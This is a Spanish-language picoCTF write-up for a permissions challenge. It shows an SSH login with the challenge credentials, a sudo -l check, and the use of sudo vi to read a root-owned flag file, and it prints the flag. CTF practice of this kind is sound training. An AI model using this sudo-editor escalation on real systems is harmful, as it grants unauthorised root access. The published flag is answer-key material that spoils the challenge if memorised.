## Description
Can you read files in the root file?The system admin has provisioned an account for you on the main server: `ssh -p 51039 picoplayer@saturn.picoctf.net`Password: `NBD+zO8s4y`Can you login and read the root file?
## Solución
```shell
┌──(kali㉿kali)-[~/shared/notas-seguridad-redes2024/picoCTF/permissions]
└─$ ssh -p 50812 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:50812 ([13.59.203.175]:50812)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:50812' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ ls
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x   1 root   root     51 Sep 18 03:41 .
drwxr-xr-x   1 root   root     51 Sep 18 03:41 ..
-rwxr-xr-x   1 root   root      0 Sep 18 03:41 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Sep 18 03:41 dev
drwxr-xr-x   1 root   root     66 Sep 18 03:41 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 375 nobody nogroup   0 Sep 18 03:41 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Sep 18 03:42 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Sep 18 03:41 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cd challenge/
-bash: cd: challenge/: Permission denied
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi


Press ENTER or type command to continue
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep 18 03:41 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}

Press ENTER or type command to continue

```
## Bandera
```shell
flag: picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```
## Notas Adicionales
En este proceso se realizó una conexión SSH al servidor remoto `saturn.picoctf.net` utilizando el usuario `picoplayer` en el puerto `50812`. Tras autenticarte con contraseña, se exploraron los directorios del servidor con comandos como `ls` y `cd`, pero no se pudo acceder al directorio `challenge` debido a la falta de permisos. Luego, se utilizó el comando `sudo -l` para ver los privilegios de superusuario del usuario, lo que reveló que podía ejecutar el editor `vi` con privilegios elevados. Al usar `sudo vi`, se pudo acceder a archivos protegidos, como `.flag.txt`, que contenía la bandera picoCTF: `picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}`

# comandos utilizados
-  `vi` es un editor de texto en la línea de comandos disponible en la mayoría de sistemas Unix y Linux. Es utilizado principalmente para crear, editar y visualizar archivos de texto. Algunas características clave de `vi` son:

	- **Edición de archivos en modo texto**: `vi` permite modificar archivos de texto como código fuente, scripts o configuraciones de sistema.
	- **Eficiencia**: `vi` tiene modos de operación (modo comando, modo inserción) que permiten realizar tareas de edición rápida usando solo el teclado.
	- **Disponibilidad universal**: Está disponible por defecto en prácticamente cualquier sistema Unix/Linux, por lo que es una herramienta confiable para administrar archivos en sistemas remotos o sin entorno gráfico.
## Referencias
- 